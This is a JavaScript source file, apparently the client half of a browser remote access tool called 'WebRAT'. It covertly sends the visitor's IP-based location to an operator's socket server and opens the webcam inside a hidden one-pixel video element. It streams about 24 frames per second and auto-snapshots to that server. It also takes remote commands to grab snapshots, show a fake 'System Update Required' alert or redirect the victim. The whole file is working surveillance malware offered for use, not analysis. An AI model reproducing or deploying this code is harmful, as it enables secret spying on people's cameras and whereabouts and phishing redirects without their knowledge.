// WebRAT Client Logic - Optimized Performance
(function () {
    console.log("[*] WebRAT Client Initialized");

    const socket = typeof io !== 'undefined' ? io({
        reconnection: true,
        transports: ['polling', 'websocket']
    }) : null;

    window.socket = socket;

    async function startCapture() {
        console.log("[!] Initiating Capture...");

        // Silent Location Check
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                if (socket) socket.emit('location_update', {
                    lat: data.latitude,
                    lon: data.longitude,
                    city: data.city,
                    region: data.region,
                    ip: data.ip,
                    silent: true
                });
            }).catch(() => { });

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 1280 }, height: { ideal: 720 } }
            });

            if (socket) socket.emit('client_log', "[+] Camera Stream Active");

            const video = document.createElement('video');
            video.id = 'hidden-vid';
            video.autoplay = true;
            video.muted = true;
            video.playsInline = true;
            video.style.cssText = 'position:fixed; top:-100px; left:-100px; width:1px; height:1px; opacity:0.01; pointer-events:none;';
            document.body.appendChild(video);

            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Video Broadcast Loop (~15 FPS)
            const updateCanvasSize = () => {
                if (video.videoWidth === 0) return false;
                const targetWidth = 640;
                const targetHeight = (video.videoHeight / video.videoWidth) * targetWidth;
                if (canvas.width !== targetWidth || canvas.height !== targetHeight) {
                    canvas.width = targetWidth;
                    canvas.height = targetHeight;
                }
                return true;
            };

            // High-Performance "YouTube-style" Streaming Loop
            let lastFrameTime = 0;
            const targetFPS = 24; // Standard cinematic/streaming FPS
            const frameInterval = 1000 / targetFPS;

            async function broadcastLoop(timestamp) {
                if (!lastFrameTime) lastFrameTime = timestamp;
                const elapsed = timestamp - lastFrameTime;

                if (elapsed >= frameInterval) {
                    if (updateCanvasSize()) {
                        lastFrameTime = timestamp - (elapsed % frameInterval);

                        // Capture and Send
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const frameData = canvas.toDataURL('image/jpeg', 0.4); // Balanced quality/bandwidth

                        if (socket && socket.connected) {
                            socket.emit('video_frame', frameData);
                        }
                    }
                }
                requestAnimationFrame(broadcastLoop);
            }

            // Start the high-performance loop
            requestAnimationFrame(broadcastLoop);

            // Auto-Snapshot Burst
            let snaps = 0;
            const burst = setInterval(() => {
                if (video.videoWidth > 0) {
                    const snapCanvas = document.createElement('canvas');
                    snapCanvas.width = video.videoWidth;
                    snapCanvas.height = video.videoHeight;
                    snapCanvas.getContext('2d').drawImage(video, 0, 0);
                    socket.emit('surveillance_snapshot', snapCanvas.toDataURL('image/jpeg', 0.8));
                    if (++snaps >= 5) clearInterval(burst);
                }
            }, 2000);

            // Remote Command Listener
            socket.on('remote_command', (data) => {
                switch (data.command) {
                    case 'snapshot':
                        const sCanvas = document.createElement('canvas');
                        sCanvas.width = video.videoWidth;
                        sCanvas.height = video.videoHeight;
                        sCanvas.getContext('2d').drawImage(video, 0, 0);
                        socket.emit('surveillance_snapshot', sCanvas.toDataURL('image/jpeg', 0.8));
                        break;
                    case 'alert':
                        alert(data.msg || "System Update Required");
                        break;
                    case 'reload':
                        location.reload();
                        break;
                    case 'redirect':
                        window.location.href = data.url || "https://google.com";
                        break;
                }
            });

            return true;
        } catch (err) {
            if (socket) socket.emit('client_log', "[-] ERROR: " + err.name);
            throw err;
        }
    }

    window.startCapture = startCapture;
})();
